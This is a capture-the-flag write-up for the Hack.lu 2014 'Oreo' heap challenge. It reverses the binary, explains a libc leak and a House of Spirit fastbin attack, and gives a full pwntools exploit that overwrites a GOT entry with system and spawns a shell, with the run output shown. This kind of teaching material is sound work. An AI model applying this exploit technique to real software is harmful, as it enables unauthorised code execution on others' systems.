# Hack.lu 2014 Oreo

Let's take a look at the binary and libc:

```
$    pwn checksec oreo
[*] '/Hackery/pod/modules/house_of_spirit/hacklu14_oreo/oreo'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    file oreo
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
$    ./libc-2.24.so
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release version 2.24, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 6.3.0 20170406.
Available extensions:
    crypt add-on version 2.1 by Michael Glad and others
    GNU Libidn by Simon Josefsson
    Native POSIX Threads Library by Ulrich Drepper et al
    BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./oreo
Welcome to the OREO Original Rifle Ecommerce Online System!

     ,______________________________________
    |_________________,----------._ [____]  -,__  __....-----=====
                   (_(||||||||||||)___________/                   |
                      `----------'   OREO [ ))"-,                   |
                                           ""    `,  _,--....___    |
                                                   `/           """"
    
What would you like to do?

1. Add new rifle
2. Show added rifles
3. Order selected rifles
4. Leave a Message with your Order
5. Show current stats
6. Exit!
Action:
```

So we can see that we are dealing with a `32` bit binary, with a Stack Canary and NX. The libc version we got was `libc-2.24.so`. When we run the binary, we are prompted with a menu.

## Reversing

We can see the function at `0x0804898d` acts as our menu function:

```

void menu(void)

{
  int iVar1;
  undefined4 choice;
  int in_GS_OFFSET;
 
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  puts("What would you like to do?\n");
  printf("%u. Add new rifle\n",1);
  printf("%u. Show added rifles\n",2);
  printf("%u. Order selected rifles\n",3);
  printf("%u. Leave a Message with your Order\n",4);
  printf("%u. Show current stats\n",5);
  printf("%u. Exit!\n",6);
LAB_08048a25:
  choice = promptInt();
  switch(choice) {
  case 1:
    addRifles();
    goto LAB_08048a25;
  case 2:
    showRifles();
    goto LAB_08048a25;
  case 3:
    orderRifles();
    goto LAB_08048a25;
  case 4:
    leaveMessage();
    goto LAB_08048a25;
  case 5:
    showStats();
    goto LAB_08048a25;
  case 6:
    break;
  }
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Next up we have the `addRifles` function:

```
void addRifles(void)

{
  undefined4 uVar1;
  int in_GS_OFFSET;
  int canary;
 
  uVar1 = ptr;
  canary = *(int *)(in_GS_OFFSET + 0x14);
  ptr = (char *)malloc(0x38);
  if (ptr == (char *)0x0) {
    puts("Something terrible happened!");
  }
  else {
    *(undefined4 *)(ptr + 0x34) = uVar1;
    printf("Rifle name: ");
    fgets(ptr + 0x19,0x38,stdin);
    nullTerminate(ptr + 0x19);
    printf("Rifle description: ");
    fgets(ptr,0x38,stdin);
    nullTerminate(ptr);
    riflesCount = riflesCount + 1;
  }
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see a bit here about how the rifles are stored. They are not stored in an array of heap pointers, but rather a linked list. The head of the linked list is stored in the bss variable `ptr` at the address `0x804a288`. New rifles are inserted at the head of the linked list. An actual rifle object has this structure:

```
Size of heap chunk, 0x38
0x00: Rifle Description
0x19: Rilfe Name
0x34: Ptr to next rifle
```

We can see that we have two writes. The first is `0x38` bytes of data at `0x19` offset, and the second is `0x38` bytes from the start of the chunk. Both of these will give us an overflow, at least to the next pointer of the chunk. The first write will actually allow us to overflow outside of our heap chunk. Next up we have `showRifles`:

```
void showRifles(void)

{
  int in_GS_OFFSET;
  int currentPtr;
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  printf("Rifle to be ordered:\n%s\n","===================================");
  currentPtr = ptr;
  while (currentPtr != 0) {
    printf("Name: %s\n",currentPtr + 0x19);
    printf("Description: %s\n",currentPtr);
    puts("===================================");
    currentPtr = *(int *)(currentPtr + 0x34);
  }
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can see here, this function essentially loops through our linked list and prints the name and description of all of the rifles. Next up we have the `orderRifles` function:

```
void orderRifles(void)

{
  int in_GS_OFFSET;
  void *currentPtr;
  int canary;
  void *newPtr;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  currentPtr = ptr;
  if (riflesCount == 0) {
    puts("No rifles to be ordered!");
  }
  else {
    while (currentPtr != (void *)0x0) {
      newPtr = *(void **)((int)currentPtr + 0x34);
      free(currentPtr);
      currentPtr = newPtr;
    }
    ptr = (void *)0x0;
    orders = orders + 1;
    puts("Okay order submitted!");
  }
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This function essentially loops through our linked list, and frees all of the heap chunks. It then zeroes out `ptr` and increments the bss variable `orders` stored at `0x0804a2a0`:

```
void leaveMessage(void)

{
  int in_GS_OFFSET;
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  printf("Enter any notice you\'d like to submit with your order: ");
  fgets(message,0x80,stdin);
  nullTerminate(message);
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

For this function, we can see that it allows us to scan `0x80` bytes worth of data into the char array pointed to by the bss ptr `message`, located at `0x804a2a8`. We can see confirm this in gdb:

```
gef➤  r
Starting program: /Hackery/pod/modules/house_of_spirit/hacklu14_oreo/oreo
Welcome to the OREO Original Rifle Ecommerce Online System!

     ,______________________________________
    |_________________,----------._ [____]  -,__  __....-----=====
                   (_(||||||||||||)___________/                   |
                      `----------'   OREO [ ))"-,                   |
                                           ""    `,  _,--....___    |
                                                   `/           """"
 
What would you like to do?

1. Add new rifle
2. Show added rifles
3. Order selected rifles
4. Leave a Message with your Order
5. Show current stats
6. Exit!
Action: 4
Enter any notice you'd like to submit with your order: 15935728
Action: ^C

. . .

gef➤  x/w 0x804a2a8
0x804a2a8:  0x804a2c0
gef➤  x/w 0x804a2c0
0x804a2c0:  0x33393531
gef➤  x/s 0x804a2c0
0x804a2c0:  "15935728"
```

Next up:

```
void showStats(void)

{
  int in_GS_OFFSET;
  int canary;
 
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("======= Status =======");
  printf("New:    %u times\n",riflesCount);
  printf("Orders: %u times\n",orders);
  if (*message != '\0') {
    printf("Order Message: %s\n",message);
  }
  puts("======================");
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Finally we have the showStats function, which will print the value of `riflesCount`, `orders`, and `message`.

## Exploitation

So starting off, we will get a libc infoleak. Then we will execute a House of Spirit attack, to allocate a fake chunk at `0x804a2a8`. We will leverage this to overwrite the `message` ptr to point to the got entry for `scanf`. We will then perform a got overwrite using the `leaveMessage` function to be the libc address for `system`. After that, we will just call `scanf` with the argument being `/bin/sh` and get a shell.

Overwriting `scanf` might seem a bit weird, since it is what scans in our data. However in the `promptInt` function, we can see that our input is first scanned in via `fgets`, then passed to `scanf` so it will work for our use:

```
undefined4 promptInt(void)

{
  int iVar1;
  int iVar2;
  int in_GS_OFFSET;
  undefined4 int;
  char input [32];
 
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  do {
    printf("Action: ");
    fgets(input,0x20,stdin);
    iVar2 = __isoc99_sscanf(input,&fmtString,&int);
  } while (iVar2 == 0);
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return int;
}
```

#### Libc Infoleak

For the libc infoleak, we will overflow the next pointer of one of the rifles with a got entry address. Proceeding that, we will run the `showRifles` function. When it prints the name of the second rifle, the first four bytes of the output will be our libc infoleak. With that, we can break ASLR in libc.

#### House of Spirit

First let's talk about how a House of Spirit attack works. The idea of a House of Spirit attack is to get malloc to return a pointer to a chunk of memory we want. To execute this, we will setup two fake chunks. The first chunk we setup is the one that we will get malloc to return. After the setup, we will free the first chunk which will add it to the fastbin list. Then we will allocate it with malloc.

For the setup for the chunks, we need to set the size value for the chunks. A quick refresher, the size is the first 4 bytes (8 bytes for x64 systems) before the actual content of the chunk. There are three requirements for what this value can be for the first chunks. The first is that it has to be the same size as the size malloc needs, when you are actually trying to get malloc to return the fake chunk. Keep in mind, this includes the heap metadata with the chunk, so it will be bigger than the size you pass malloc. In `x86` systems, the heap metadata takes up `0x8` bytes, and in `x64` systems the heap metadata takes up `0x10` bytes. In addition to that, malloc will just round certain sizes up. In this binary, we can see that rifles sizes are `0x41` bytes big (the `0x1` is from the previous in use bit), although we only requested `0x30` bytes of space.

The second requirement is that the chunk sizes must be fastbin size. Since we are trying to get this chunk in the fastbin, it's a bit of a given. The third requirement is that the size values have to be placed at offsets that would match actual chunks that are adjacent in memory. So if your first size value is `0x40`, assume that the second chunk's metadata starts `0x40` bytes after the start of the content section of the first chunk. Also the sizes of the two chunks don't need to be the same (however the second chunk's size still needs to be fastbin size). Also you don't need to set the previous chunk size in the heap metadata.

Now for executing this attack on this ctf challenge. Our goal will be to allocate a chunk at `0x804a2a8`. For that we will need to set a fake size at `0x804a2a4`. This matches up to the bss integer `riflesCount`. Since our only real control over this is making new files, we will need to allocat `0x41` rifles to set the size to `0x41` (since that is the actual size of a rifle chunk). With that, it will expect our second chunk at `0x3c + 0x4 = 0x40` bytes away from the first size value. We have the `0x3c` bytes from the first chunk which is `0x40` bytes big (the first `0x4` bytes is the previous freed chunk size), and `0x4` bytes from the next chunk's previous free chunk size.

## Exploit

Putting it all together, we have the following exploit. This exploit was ran on Ubuntu 16.0 :

```
# This exploit is based off of https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/

from pwn import *

target = process('./oreo', env={"LD_PRELOAD":"./libc-2.23.so"})
gdb.attach(target)
elf = ELF('oreo')
libc = ELF("libc-2.23.so")

def addRifle(name, desc):
  target.sendline('1')
  target.sendline(name)
  target.sendline(desc)

def leakLibc():
  target.sendline('2')
  print target.recvuntil("Description: ")
  print target.recvuntil("Description: ")
  leak = target.recvline()
  puts = u32(leak[0:4])
  libc_base = puts - libc.symbols['puts']
  return libc_base

def orderRifles():
  target.sendline("3")

def leaveMessage(content):
  target.sendline("4")
  target.sendline(content)

# First commence the initial overflow of the previous gun ptr with the got address of puts for the infoleak
addRifle('0'*0x1b + p32(elf.got['puts']), "15935728")

# Show the guns, scan in and parse out the infoleak, figure out the base of libc, and figure out where system is
libc_base = leakLibc()
system = libc_base + libc.symbols['system']
log.info("System is: " + hex(system))

# Iterate through 0x3f cycles of adding then freeing that rifle, to increment new_rifles to 0x40. Also we need to overwrite the value of previous_rifle_ptr with 0x0, so the free check won't do anything (and the program won't crash)
for i in xrange(0x3f):
  addRifle("1"*0x1b + p32(0x0), "1593")
  orderRifles()

# Add a rifle to overwrite the next ptr for the rifle to the address of 0x804a2a8 (our fake chunk for the house of spirit)
addRifle("1"*0x1b + p32(0x804a2a8), "15935728")

# Write the size value of the second fake chunk by leaving a message
leaveMessage(p32(0)*9 + p32(0x81))


# Free the fake chunk, so it ends up in the fast bin
orderRifles()

# Allocate a new chunk of heap, which will allow us to write over 0x804a2a8 which is messafe_storage_ptr with the got address of scanf
addRifle("15935728", p32(elf.got['__isoc99_sscanf']))

# Write over the value stored in the got address of scanf with the libc address of system which we got from the infoleak
leaveMessage(p32(system))

# Send the string /bin/sh which will get scanned into memory with fgets, then passed to system (supposed to be passed to scanf)
target.sendline("/bin/sh")

# Drop to an interactive shell
target.interactive()
```

```
$ python exploit.py
[+] Starting local process './oreo': pid 3935
[*] '/Hackery/pod/modules/house_of_spirit/hacklu14_oreo/oreo'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/Hackery/pod/modules/house_of_spirit/hacklu14_oreo/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Welcome to the OREO Original Rifle Ecommerce Online System!

     ,______________________________________
    |_________________,----------._ [____]  -,__  __....-----=====
                   (_(||||||||||||)___________/                   |
                      `----------'   OREO [ ))"-,                   |
                                           ""    `,  _,--....___    |
                                                   `/           """"
    
What would you like to do?

1. Add new rifle
2. Show added rifles
3. Order selected rifles
4. Leave a Message with your Order
5. Show current stats
6. Exit!
Action: Rifle name: Rifle description: Action: Rifle to be ordered:
===================================
Name: 000000000000000000000000000H\xa2\x0
Description:
15935728
===================================
Name:
Description:
[*] System is: 0xf7dceda0
[*] Switching to interactive mode
===================================
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Okay order submitted!
Action: Rifle name: Rifle description: Action: Enter any notice you'd like to submit with your order: Action: Okay order submitted!
$
$ w
 21:49:25 up  2:37,  1 user,  load average: 0.30, 0.11, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               19:12    2:37m  1:39   0.20s /sbin/upstart --user
$ ls
core  exploit.py  libc-2.23.so    libc-2.24.so  oreo  readme.md  try.py
```

Just like that, we popped a shell!